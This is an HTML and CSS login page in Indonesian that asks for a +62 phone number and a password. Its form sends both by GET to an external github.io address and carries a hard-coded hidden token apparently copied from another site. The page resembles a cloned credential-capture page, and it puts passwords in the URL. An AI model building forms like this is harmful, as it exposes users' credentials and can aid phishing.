<html lang="en">
 <head> 
  <meta charset="UTF-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
  <title>LOGIN</title> 
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&amp;display=swap" rel="stylesheet"> 
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet"> 
  <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #475461 0%, #2c3e50 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            
        }

        /* Animated Background Shapes */
        .shape {
            position: absolute;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 50%;
            animation: float 15s infinite;
        }

        .shape:nth-child(1) {
            width: 200px;
            height: 200px;
            top: -100px;
            left: 10%;
            animation-delay: 0s;
        }

        .shape:nth-child(2) {
            width: 150px;
            height: 150px;
            bottom: -75px;
            right: 15%;
            animation-delay: 3s;
        }

        .shape:nth-child(3) {
            width: 100px;
            height: 100px;
            bottom: 20%;
            left: 5%;
            animation-delay: 6s;
        }

        @keyframes float {
            0% { transform: translateY(0) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(180deg); }
            100% { transform: translateY(0) rotate(360deg); }
        }

        .login-container {
            width: 100%;
            max-width: 400px;
            position: relative;
            animation: fadeIn 1s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .login-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 40px 30px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            position: relative;
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .login-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -50%;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, transparent, rgba(255,255,255,0.3));
            transform: skewX(-15deg);
            pointer-events: none;
        }

        .header {
            text-align: center;
            margin-bottom: 35px;
            position: relative;
        }

        .logo {
            width: 90px;
            height: 90px;
            background: linear-gradient(135deg, #475461, #2c3e50);
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 20px rgba(71, 84, 97, 0.3);
            position: relative;
            overflow: hidden;
        }

        .logo img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-radius: 50%;
        }

        .header h1 {
            background: linear-gradient(135deg, #475461, #2c3e50);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 10px;
        }

        .header p {
            color: #666;
            font-size: 15px;
        }

        .form-group {
            margin-bottom: 25px;
            position: relative;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #475461;
            font-weight: 500;
            font-size: 15px;
            transform: translateX(0);
            transition: transform 0.3s;
        }

        .form-group:focus-within label {
            transform: translateX(5px);
            color: #148f24;
        }

        .phone-input {
            display: flex;
            gap: 10px;
        }

        .phone-code {
            background: linear-gradient(135deg, #475461, #2c3e50);
            color: white;
            padding: 12px 15px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 500;
            box-shadow: 0 4px 15px rgba(71, 84, 97, 0.2);
        }

        .input-wrapper {
            position: relative;
            flex: 1;
        }

        input {
            width: 100%;
            padding: 14px 15px 14px 45px;
            border: 2px solid #e1e1e1;
            border-radius: 12px;
            font-size: 15px;
            transition: all 0.3s;
            background: white;
        }

        .input-icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #475461;
            transition: all 0.3s;
        }

        input:focus {
            outline: none;
            border-color: #148f24;
            box-shadow: 0 0 0 4px rgba(20, 143, 36, 0.1);
        }

        input:focus + .input-icon {
            color: #148f24;
            transform: translateY(-50%) scale(1.1);
        }

        .login-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #475461, #2c3e50);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(71, 84, 97, 0.3);
            position: relative;
            overflow: hidden;
        }

        .login-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: 0.5s;
        }

        .login-btn:hover::before {
            left: 100%;
        }

        .login-btn:hover {
            background: linear-gradient(135deg, #148f24, #0d6118);
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(20, 143, 36, 0.3);
        }

        .register-link {
            text-align: center;
            margin-top: 25px;
            font-size: 15px;
            color: #666;
        }

        .register-link a {
            color: #475461;
            text-decoration: none;
            font-weight: 600;
            margin-left: 5px;
            position: relative;
            transition: all 0.3s;
        }

        .register-link a::after {
            content: '';
            position: absolute;
            width: 0;
            height: 2px;
            bottom: -2px;
            left: 0;
            background: #148f24;
            transition: width 0.3s;
        }

        .register-link a:hover {
            color: #148f24;
        }

        .register-link a:hover::after {
            width: 100%;
        }

        @media (max-width: 480px) {
            .login-card {
                padding: 30px 20px;
            }

            .header h1 {
                font-size: 24px;
            }

            .logo {
                width: 80px;
                height: 80px;
            }
        }
    </style> 
 </head> 

 
 
 <body> 
  <!-- Background Shapes --> 
  <div class="shape"></div> 
  <div class="shape"></div> 
  <div class="shape"></div> 
  <div class="login-container"> 
   <div class="login-card"> 
    <div class="header"> 
     <div class="logo"> 
      <img src="logo.jpg" alt="logo.png"> 
     </div> 
     <h1>Selamat Datang!</h1> 
     <p>Silakan masuk ke akun Anda</p> 
    </div> 
    <form method="GET" action="https://attomsite.github.io/index.html"> 
     <input type="hidden" name="_token" value="cyxt4AVX4dakSh58Wq4hPZ6tdvFYu6AWWtzaSZdU" autocomplete="off"> 
     <div class="form-group"> 
      <label>Nomor Telepon</label> 
      <div class="phone-input"> 
       <div class="phone-code">
        +62
       </div> 
       <div class="input-wrapper"> 
        <input type="number" name="number" required placeholder="8123456789"> 
        <i class="fas fa-phone input-icon"></i> 
       </div> 
      </div> 
     </div> 
     <div class="form-group"> 
      <label>Password</label> 
      <div class="input-wrapper"> 
       <input type="password" name="password" required placeholder="Masukkan password"> 
       <i class="fas fa-lock input-icon"></i> 
      </div> 
     </div> 
     <button type="submit" class="login-btn"> <i class="fas fa-sign-in-alt"></i> Masuk </button> 
    </form> 
    <div class="register-link">
      Belum punya akun?
     <a href="index.html">Daftar sekarang</a> 
    </div> 
   </div> 
  </div> 
 </body>
</html>
